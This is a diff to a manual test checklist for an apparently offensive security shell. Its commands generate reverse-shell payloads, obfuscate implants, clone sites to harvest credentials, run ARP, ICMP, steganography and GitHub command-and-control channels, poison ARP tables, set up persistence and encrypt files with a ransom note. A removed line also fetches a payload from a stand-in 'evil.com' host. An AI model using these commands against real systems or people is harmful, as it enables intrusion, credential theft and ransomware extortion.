@@ -10,66 +10,107 @@ This document outlines the steps to manually test and verify the functionality o
 -   [ ] **`exit`**:
     -   **Action:** Run the `exit` command.
     -   **Expected:** The shell exits gracefully.
--   [ ] **Unknown Command**:
-    -   **Action:** Enter a non-existent command (e.g., `foobar`).
-    -   **Expected:** An "Unknown command" error is displayed.
 -   [ ] **`targets`**:
     -   **Action:** Run `targets` on a fresh startup.
     -   **Expected:** A "No targets found" message is displayed.
-    -   **Action:** Run `scan 127.0.0.1/24` (or a relevant subnet), then run `targets`.
-    -   **Expected:** The `targets` list shows the newly discovered hosts correctly.
 -   [ ] **`scan <subnet>`**:
-    -   **Action:** Run `scan` on a known local subnet.
-    -   **Expected:** The scan discovers live hosts and adds them to the target list. The output should be a list of IPs, open ports, and threat scores.
+    -   **Action:** Run `scan 127.0.0.1/32`.
+    -   **Expected:** The scan discovers the localhost and adds it to the target list.
 -   [ ] **`set` and `info`**:
-    -   **Action:** Run `info` with no target selected.
-    -   **Expected:** A "No target selected" message is displayed.
-    -   **Action:** Run `set <ip>` to select a target.
+    -   **Action:** Run `set 127.0.0.1` after a scan.
     -   **Expected:** The shell prompt updates to show the selected target.
     -   **Action:** Run `info`.
     -   **Expected:** The `info` command displays the correct information for the selected target.
+-   [ ] **`recon <ip>`**:
+    -   **Action:** Run `recon 127.0.0.1`.
+    -   **Expected:** A detailed Nmap scan runs and the results, including OS and service versions, are printed. The results are also stored in the target manager.
+-   [ ] **`explain <type>`**:
+    -   **Action:** Run `explain xxe`.
+    -   **Expected:** A detailed explanation of the XXE attack is displayed.
 
-## 2. `lure` Command (Social Engineering)
+## 2. Payload Generation
 
--   [ ] **`lure` (no arguments)**:
-    -   **Action:** Run the `lure` command.
-    -   **Expected:** The `lure` help menu is displayed.
--   [ ] **`lure web <url> <payload_url>`**:
-    -   **Action:** Run `lure web http://example.com http://evil.com/payload.js`.
-    -   **Expected:** A `cloned_site/index.html` file is created. The HTML should contain a script tag pointing to the payload URL.
--   [ ] **`lure doc <path> <payload_cmd>`**:
-    -   **Action:** Run `lure doc /tmp/report.docx "powershell -e <encoded_command>"`.
-    -   **Expected:** A `/tmp/report.docx` file is created.
+-   [ ] **`generate <platform> <lhost> <lport> <output>`**:
+    -   **Action:** Run `generate windows 127.0.0.1 4444 /tmp/payload.exe`. (Requires msfvenom to be installed).
+    -   **Expected:** A Windows reverse TCP payload is created at `/tmp/payload.exe`.
+-   [ ] **`generate_file <type>`**:
+    -   **Action:** Run `generate_file xxe`.
+    -   **Expected:** A malicious `xxe.xml` file is created in the `test_files` directory.
+-   [ ] **`morph <input> <output>`**:
+    -   **Action:** Run `morph icmp_implant.py /tmp/morphed_implant.py`.
+    -   **Expected:** A new, obfuscated version of the implant is created at `/tmp/morphed_implant.py`.
+-   [ ] **`qrcode <url> <output>`**:
+    -   **Action:** Run `qrcode http://example.com /tmp/qr.png`.
+    -   **Expected:** A QR code image is created at `/tmp/qr.png`.
 
-## 3. `covert` Command (ARP Covert Channel)
+## 3. Social Engineering (`lure`)
 
--   [ ] **`covert` (no arguments)**:
-    -   **Action:** Run the `covert` command.
-    -   **Expected:** The `covert` help menu is displayed.
+-   [ ] **`lure harvest`**:
+    -   **Action:** Run `lure harvest` in a separate terminal.
+    -   **Expected:** The credential harvester server starts.
+-   [ ] **`lure web <url>`**:
+    -   **Action:** With the harvester running, run `lure web http://example.com`.
+    -   **Expected:** A `cloned_site/index.html` is created with forms redirected to the harvester.
+    -   **Verification:** Open the cloned file in a browser, submit a form, and check the harvester terminal for captured credentials.
+
+## 4. Covert C2 Channels
+
+### `covert` (ARP)
 -   [ ] **`covert generate_listener <path>`**:
     -   **Action:** Run `covert generate_listener /tmp/listener.py`.
-    -   **Expected:** The `covert_listener.py` script is copied to `/tmp/listener.py`.
--   [ ] **Payload Delivery (requires two separate terminals)**:
-    -   **Terminal 1:** Run the generated listener: `python3 /tmp/listener.py`.
-    -   **Terminal 2:**
-        -   **Action:** Run `covert send_cmd <listener_ip> "echo 'test' > /tmp/covert_test.txt"`.
-        -   **Expected (Terminal 1):** The listener logs show the reception and execution of the command. The file `/tmp/covert_test.txt` should be created with the content "test".
-        -   **Action:** Create a simple test file (e.g., `echo '#!/bin/bash' > /tmp/test.sh; echo 'touch /tmp/covert_exec_test.txt' >> /tmp/test.sh; chmod +x /tmp/test.sh`). Then, run `covert send_file <listener_ip> /tmp/test.sh`.
-        -   **Expected (Terminal 1):** The listener logs show the reception and execution of the file. The file `/tmp/covert_exec_test.txt` should be created.
+    -   **Expected:** The listener script is created.
+-   [ ] **`covert send_cmd <ip> <cmd>`**:
+    -   **Action:** Run the listener in one terminal and `covert send_cmd 127.0.0.1 "echo test > /tmp/test.txt"` in another. (Requires root).
+    -   **Expected:** The file `/tmp/test.txt` is created.
 
-## 4. `mitm` Command (Man-in-the-Middle)
+### `icmp`
+-   [ ] **`icmp generate <path>`**:
+    -   **Action:** Run `icmp generate /tmp/implant.py`.
+    -   **Expected:** The ICMP implant is created.
+-   [ ] **`icmp listen` and `icmp send`**:
+    -   **Action:** Run the implant and the `icmp listen` command in separate terminals. Then run `icmp send 127.0.0.1 "whoami"`. (Requires root).
+    -   **Expected:** The listener terminal should print the output of the "whoami" command.
 
--   [ ] **`mitm` (no arguments)**:
-    -   **Action:** Run the `mitm` command.
-    -   **Expected:** The `mitm` help menu is displayed.
+### `stego_c2`
+-   [ ] **`stego_c2 start`**:
+    -   **Action:** Run `stego_c2 start`.
+    -   **Expected:** The steganography C2 server starts.
+-   [ ] **`stego_c2 command <cmd>`**:
+    -   **Action:** Run `stego_c2 command "ls -l"`.
+    -   **Expected:** The command is encoded into the command image.
+-   [ ] **Implant Check-in**:
+    -   **Action:** Run the generated `stego_implant.py`.
+    -   **Expected:** The C2 server should receive the output of the "ls -l" command.
+
+### `github_c2`
+-   [ ] **`github_c2 configure <token> <owner> <repo>`**:
+    -   **Action:** Configure the C2 with a valid GitHub token and repository.
+    -   **Expected:** The C2 is configured successfully.
+-   [ ] **`github_c2 command <cmd>`**:
+    -   **Action:** Run `github_c2 command "whoami"`.
+    -   **Expected:** The command is successfully written to the repository.
+-   [ ] **Implant Check-in**:
+    -   **Action:** Run the generated `github_implant.py`.
+    -   **Expected:** The implant should execute the command and commit the output back to the repository. `github_c2 output` should retrieve it.
+
+## 5. Attack Modules
+
+### `mitm`
 -   [ ] **`mitm scan <subnet>`**:
-    -   **Action:** Run `mitm scan` on a known local subnet.
-    -   **Expected:** The output lists live hosts with their IP and MAC addresses.
--   [ ] **ARP Poisoning and Restoration**:
-    -   **Action:** Run `mitm poison <target_ip> <gateway_ip>`.
-    -   **Verification (Manual):** On a separate machine on the network, check the ARP table (`arp -a`). The MAC address for the gateway should match the attacker's MAC address.
-    -   **Action:** Run `mitm stop`.
-    -   **Verification (Manual):** Check the ARP table on the target machine again. The MAC address for the gateway should be restored to its original value.
--   [ ] **Credential Sniffing**:
-    -   **Action:** While `mitm poison` is running, generate unencrypted HTTP POST traffic from the target machine containing keywords like "username" or "password".
-    -   **Expected:** The main shell on the attacker's machine should print a "Potential credentials found" message along with the captured data.
+    -   **Action:** Run `mitm scan` on a local subnet.
+    -   **Expected:** A list of live hosts is returned.
+-   [ ] **`mitm poison <target> <gateway>`**:
+    -   **Action:** Run an ARP poisoning attack. (Requires root and a proper network setup).
+    -   **Expected:** The target's ARP table should be poisoned.
+
+### `persist`
+-   [ ] **`persist <os> <path>`**:
+    -   **Action:** Run `persist windows C:\\path\\to\\implant.exe`.
+    -   **Expected:** The correct command for creating a Windows Run key is displayed.
+    -   **Action:** Run `persist linux /path/to/implant.py`.
+    -   **Expected:** The correct command for creating a Linux cron job is displayed.
+
+### `ransom`
+-   [ ] **`ransom <dir>`**:
+    -   **Action:** Run `ransom /tmp/test_encryption`.
+    -   **Expected:** Files in the test directory are encrypted and a ransom note is dropped.
